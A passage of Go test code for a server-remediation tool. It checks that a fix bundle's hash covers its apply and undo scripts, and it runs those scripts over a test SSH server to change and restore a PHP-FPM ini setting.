	for name, f := range map[string]func(x *serverfix.Bundle){
		"apply":  func(x *serverfix.Bundle) { x.Apply += "\n" },
		"undo":   func(x *serverfix.Bundle) { x.Undo += "\n" },
		"checks": func(x *serverfix.Bundle) { x.Checks = nil },
		"shift": func(x *serverfix.Bundle) {
			x.Undo = x.Apply[len(x.Apply)-1:] + x.Undo
			x.Apply = x.Apply[:len(x.Apply)-1]
		},
	} {
		x := b
		f(&x)
		if serverfix.Hash(x) == b.Hash {
			t.Errorf("%s change keeps the hash", name)
		}
	}
	// Explain does not count: it is a translation of the scripts.
	x := b
	x.Explain = "other"
	if serverfix.Hash(x) != b.Hash {
		t.Error("explain changes the hash")
	}
	if !strings.Contains(b.Explain, fpmIni) {
		t.Errorf("explain:\n%s", b.Explain)
	}
}

// --- over SSH -----------------------------------------------------------

func TestScriptsRunOnSSHTest(t *testing.T) {
	sh := &sshtest.Shell{UID: 1000, Home: "/home/deploy"}
	h := newHarness(t, sh, map[string]bool{fpmIni: true}, false)
	host, port, err := net.SplitHostPort(h.srv.Addr())
	if err != nil {
		t.Fatal(err)
	}
	tg := demoTarget()
	tg.Host = host
	tg.Port, _ = strconv.Atoi(port)
	tg.HostKey = h.srv.HostKeyFingerprint()
	pol := policy.Defaults()
	pol.Sovereignty.Network.Allow = []policy.AllowRule{{Host: "127.0.0.1", Purpose: policy.PurposeTargetSSH}}
	ag := h.srv.NewAgent(t)
	d := sshx.Deps{
		Gateway:    egress.New(pol, nil),
		KnownHosts: filepath.Join(t.TempDir(), "known_hosts"),
		Agent:      func() (agent.ExtendedAgent, io.Closer, error) { return ag, nil, nil },
		Now:        time.Now,
	}
	c, err := sshx.Dial(context.Background(), d, tg)
	if err != nil {
		t.Fatalf("Dial: %v", err)
	}
	t.Cleanup(func() { c.Close() })

	b := render(t, setDirective("fpm", "display_errors", "0", ""), tg)
	res, err := c.Run(context.Background(), []string{"sh", "-s"}, strings.NewReader(b.Apply))
	if err != nil || res.Exit != 0 {
		t.Fatalf("apply: %v exit %d stderr %s", err, res.Exit, res.Stderr)
	}
	if got := h.file(t, fpmIni); got != "[PHP]\nengine = On\ndisplay_errors = 0\nmemory_limit = 128M\n" {
		t.Fatalf("after apply:\n%q", got)
	}
	if !strings.Contains(string(res.Stdout), "correction appliquee") {
		t.Errorf("stdout %q", res.Stdout)
	}
	res, err = c.Run(context.Background(), []string{"sh", "-s"}, strings.NewReader(b.Undo))
	if err != nil || res.Exit != 0 {
		t.Fatalf("undo: %v exit %d stderr %s", err, res.Exit, res.Stderr)
	}
	if h.file(t, fpmIni) != iniText {
		t.Fatal("undo did not restore the file byte for byte")
	}
	if h.file(t, "/home/deploy/.michel/backups/"+cid+"/1") != iniText {
		t.Error("backup missing")
	}
}
